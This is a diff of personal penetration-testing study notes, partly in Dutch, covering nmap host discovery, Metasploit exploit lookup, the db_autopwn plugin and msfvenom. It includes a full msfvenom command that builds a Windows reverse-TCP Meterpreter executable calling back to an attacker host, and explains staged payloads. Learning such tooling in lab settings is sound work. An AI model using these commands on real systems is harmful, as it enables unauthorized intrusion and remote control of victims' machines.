@@ -376,15 +376,15 @@ www.kali.org/tools/sendemail
 ![[Pasted image 20230824101216.png]]
 
 check what hosts are up 
-   - sudo nmap -sn localnetwork/subnet 
-   - check: ip a s 
+   - `sudo nmap -sn localnetwork/subnet `
+   - check: `ip a s `
 Create a workspace 
 
 Identify vulnerability on target system 
 
 Open MSFconsole 
 1) identify vulnerable versions
-	- db_nmap -sS -sV -O target 
+	- `db_nmap -sS -sV -O target `
 	- command *hosts* shows that information from above command is stored 
 	  
 2) find exploit for version of a service 
@@ -393,8 +393,8 @@ Open MSFconsole
 
 	1) how to check if the module will work 
 		- copy module and use it 
-		- command: info (this will display info about the module and what version of the service it will exploit) 
-		- set payload to windows/meterpreter/reverse_tcp (this because we are targeting a windows system, default is linux)
+		- command: `info` (this will display info about the module and what version of the service it will exploit) 
+		- `set payload windows/meterpreter/reverse_tcp` (this because we are targeting a windows system, default is linux)
 
 3) searchsploit allows you to search in exploit db (we can limit the results to only show metasploit exploit)
 	- searchsploit "Microsoft Windows SMB" 
@@ -404,11 +404,11 @@ Open MSFconsole
 
 4) DB Autopwn plugin ![[Pasted image 20230824111947.png]]
 	- Download the metasploit plugin![[Pasted image 20230824112043.png]]
-	- move the file: sudo mv db_autopawn.rb usr/share/metasploit-framework/plugins directory 
-	- load db_autopwn 
-	- command to use the plugin: db_autopwn 
-	- use the plugin to enumerate modules: db_autopwn -p -t 
-	- use the plugin but specify the port: db_autopwn -p -t -PI 445
+	- move the file: `sudo mv db_autopawn.rb usr/share/metasploit-framework/plugins directory` 
+	- `load db_autopwn` 
+	- command to use the plugin: `db_autopwn `
+	- use the plugin to enumerate modules: `db_autopwn -p -t `
+	- use the plugin but specify the port: `db_autopwn -p -t -PI 445`
 
 
 5) analyze command will analyze content of metasploit framework database and provide list of vulnerabilities that can be exploited from services 
@@ -480,6 +480,24 @@ msfvenom
 - msfvenom is a combination of two utilities: msfpayload and msfencode 
 - msfvenom is used to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed it will connect back to our payload handler and provide us with remote access to target system. 
 
+msfvenom kan zowel staged als non-staged payload genereren: 
+Een staged payload wordt in meerdere fasen afgeleverd op het doelsysteem, bestaande uit een initiële 'stager' (**Initiële Stager**: Dit is het eerste deel van een staged payload. Het is meestal een kleine, onopvallende stukje code of script dat wordt gebruikt om een voet aan de grond te krijgen op het doelsysteem.) die een secundaire payload (**Secundaire Payload**: Dit is het tweede deel van een staged payload. Het is de eigenlijke kwaadaardige code die de aanvaller wil uitvoeren op het doelsysteem.) downloadt en uitvoert, wat meer controle en flexibiliteit biedt aan de aanvaller, terwijl een non-staged payload als één zelfstandige code wordt afgeleverd voor directe uitvoering, wat eenvoudiger is maar mogelijk gemakkelijker detecteerbaar door beveiligingssoftware vanwege zijn grotere voetafdruk.  Het idee achter staged payloads is om de initiële aanvalsketen te scheiden in twee delen: een initiële stager die moeilijker te detecteren is en een secundaire payload die de feitelijke aanvalsdoelen bereikt.
+ ![[Pasted image 20230824154209.png]] in de afbeelding kan je zien welke staged is en welke niet. De \/ is een indicatie dat het staged is en de _ _ geeft aan dat het niet-staged is. 
 
 How to generate payload with msfvenom? 
 
+1) start msfvenom 
+	- `msfvenom`
+	-  `msfvenom --list payloads` will provide you a list of payloads you can generate with msfvenom 
+	meterpreter payload will also allow you to specify the target architecture of the target operating system : Windows x64 or x32 payload. Je kan niet een x64 payload running op een 32 bit system dus het is belangrijk dat je hier goed naar kijkt 
+
+ 2) generate payload with msfvenom 
+	 - ` msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=kali_vm_ip LPORT=port_to_connect_back_to -f exe > /home/kali/Desktop/Windows_payload/payloadx86.exe`
+		 - - `-a x86`: This option specifies the architecture for the payload, which is set to "x86" in this case. x86 refers to a common 32-bit Intel processor architecture.
+		- `-p windows/meterpreter/reverse_tcp`: This option specifies the type of payload to generate. In this case, it's generating a Meterpreter payload
+		- `LHOST=kali_vm_ip`: This is the IP address where the compromised Windows machine will try to connect back to.
+		- `LPORT=port_to_connect_back_to`: port number where the compromised Windows machine will attempt to connect back to your Kali Linux machine.
+		- `-f exe`: This option specifies the format of the payload. In this case, it's specifying that the payload should be in the form of a Windows executable (.exe) file.
+		- `> /home/kali/Desktop/Windows_payload/payloadx86.exe`: This part of the command redirects the output of the payload generation to a file named `payloadx86.exe` located in the specified directory on your Kali Linux machine. This file will contain the generated payload. IMPORTANT TO SPECIFY THE EXETENTION 
+		  
+	- 
